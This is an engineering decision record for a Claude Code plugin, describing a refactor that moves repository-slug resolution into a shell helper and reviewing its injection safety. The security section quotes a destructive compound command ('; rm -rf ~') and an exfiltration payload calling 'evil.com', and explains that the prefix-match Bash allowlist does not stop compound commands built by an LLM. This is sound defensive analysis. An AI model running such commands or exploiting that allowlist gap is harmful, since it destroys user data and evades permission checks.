# Refactor: deterministic repo-slug resolver (issue #162)

**Datum**: 2026-05-09
**Trigger**: Cross-Repo Probe-2 (FlugFunkApp, 2026-05-03) — 3 Slug-Varianten in 10 Reports
**PR**: #252 (squash-merge `e5a2403`)
**Severity**: P1 GA-blocker für Cross-Repo-Track

## Problem

Across 10 Probe-2 reports of FlugFunkApp, the `repo:` frontmatter field carried three distinct sanitize results:

| Variant | Skills emitting it |
|---|---|
| `flugfunkapp` (canonical) | audit-repo, suggest-skills, review-skill (1 of 4 runs) |
| `FlugFunkApp` (no lowercase) | review-skill (3 of 4), review-agent (4 of 4) |
| `flugfunk-app` (over-hyphenation) | review-claude-config |

Reports landed in two parallel directories under `${HOME}/.claude/plugins/data/claude-config/reports/`, breaking the documented `apply-review-findings` and `review-analytics` aggregation contract.

## Root cause

`references/repo-identification.md` documented the canonical contract `slug = sanitize(basename(target_dir))` (lowercase + alphanumeric + hyphens) but as **prose**. Each emitting skill resolved the slug independently by interpreting the prose at runtime — pure "Description" altitude per `right-altitude.md`. LLM interpretation of the same prose drifted across skills.

This is the textbook **right-altitude failure**: a deterministic byte-level string transformation expressed at level 1 (prose / Description) when the natural altitude was level 4 (shell helper ≤30 LOC).

## Decision

**Move from prose-only contract → executable shell helper at `bin/repo-slug.sh`.** All emitting/consuming SKILL.md files invoke the helper via Bash with the verbatim form `bash bin/repo-slug.sh "$(pwd)"`.

## Implementation outcome

| | Plan | Implementation |
|---|---|---|
| Helper LOC | 12 | 17 (comment expansion only) |
| Test cases | 11 | 11 |
| SKILL.md migrated | 28 | 27 |
| `Bash` tool grants added | 22 | 21 |
| `make validate` | green required | green (1099 tests, 0 errors) |

## Scope refinement during implementation

`review-plugin/SKILL.md` was descoped from the Bash migration. Reason: it carries `disallowedTools: Bash, Write, Edit, WebFetch` — it cannot Write reports, and the slug reference in its prose was purely documentary. Builder removed the documentary line instead of forcing a Bash grant against the explicit `disallowedTools` constraint.

**Generalized rule for future emitter-enumerations:** when grepping the SKILL.md tree for "what skills emit reports", filter on `allowed-tools` ⊇ `{Bash, Write}` AND `disallowedTools` ⊉ either. A documentary slug reference in a non-emitting skill is not a fix target.

## 3-layer security defense (not relying on allowlist alone)

The `Bash(bash bin/repo-slug.sh:*)` allowlist is a broad prefix-match — it would NOT block a compound command like `bash bin/repo-slug.sh /tmp/x; rm -rf ~` if the LLM constructed one. True injection-safety relies on:

1. **Helper internal quoting** — `"$target"` is quoted on input to `basename`. The argument value never reaches a shell parser inside the helper. AC7 + the `test_shell_metachar_no_injection` pytest case prove this (FS canary).
2. **Verbatim invocation prose** — every modified SKILL.md specifies `bash bin/repo-slug.sh "$(pwd)"` (with quotes). Phase 7.5 Evaluator grep verifies the verbatim form in every emitting skill.
3. **Controlled argument source** — `$(pwd)` is the only documented argument source; expands to a controlled path (the user's CWD), not untrusted input.

**Honest scope of AC7**: AC7 is a regression-anchor for a single canary payload, not a comprehensive injection-safety proof. A determined adversary plus an LLM that constructs `bash bin/repo-slug.sh $(...)` payloads bypasses every AC and every verbatim-grep check. Issue #256 spikes whether tighter allowlist precision is supported.

## Honest limitations

1. **Half-deterministic invocation**: helper itself is byte-deterministic; LLM-mediated invocation through SKILL.md prose is not. Mitigated by Phase 7.5 grep + empirical AC convergence on next probe; cannot fix entirely without removing LLM from the loop (out-of-scope hook/runtime mechanism).

2. **Cross-repo `$(pwd)` flattening**: when running a review-* skill against an artifact in a different repo, the user MUST `cd` into the target repo first. This convention is now explicit in `repo-identification.md`. Matches existing `apply-*` precedent.

3. **Underscore→empty collapse**: `tr -cd 'a-z0-9-'` strips `_`, so `my_repo` and `myrepo` collide. Per documented sanitize. Documented as known-collision-risk in `repo-identification.md` "Collision Detection"; existing origin:-mismatch warning handles post-hoc.

4. **Pre-existing Hard-Constraint #1 violations** in `.claude/settings.local.json`: existing entries embed absolute home-dir prefixes. Out-of-scope for #162; tracked as #255.

## AC-predicate patterns surfaced during 3-round review

Round 2 + Round 3 plan-review surfaced three predicate-construction defects that became reusable lessons:

1. **`echo "$VAR" | wc -l == 1` on empty input is vacuous-pass** — `echo` emits a newline even when `VAR=""`. Use `printf '%s\n' "$VAR" | grep -c .` for non-empty-line count, plus an explicit `[ -n "$VAR" ] || exit 1` early guard.

2. **Canary FS file proves nothing about non-canary payloads** — AC7's "marker file not created" assertion only proves *this specific marker* wasn't created. A payload that exfiltrates data via `$(curl evil.com)` leaves AC7 silent. Comprehensive injection-safety requires either (a) helper-internal quoting (which IS the true defense here), (b) byte-equality assertion that stdout reflects literal arg sanitization, or (c) sandboxed-fuzzing.

3. **Allowlist `:*` wildcard semantics** — Claude Code's `Bash(prefix:*)` matcher does NOT split on shell metachars. A claim that "command-level allowlist constrains scope" against compound-command attacks is materially false. Empirical verification deferred to spike #256.

## Follow-up issues filed

- #254 — scaffold-skill template should default to invoke `bin/repo-slug.sh` for new emitting skills
- #255 — chore: replace hardcoded home-dir prefixes in `.claude/settings.local.json`
- #256 — spike: tighten `Bash(bash bin/repo-slug.sh:*)` allowlist precision
- #257 — docs: clarify implement-issue Phase 7 expects PR (not feature-branch CI)

## Verification artifacts

- Plan: `.work/issue-162/plan.md` (gitignored, local working artifact, 3 review rounds)
- Implementation summary: `.work/issue-162/implementation-summary.md`
- Evaluator findings: `.work/issue-162/evaluator-findings.md`
- Squash-merge commit: `e5a2403`
- Pipeline-evaluation comment: https://github.com/Nosmoht/review-claude-config/issues/162#issuecomment-4412459445
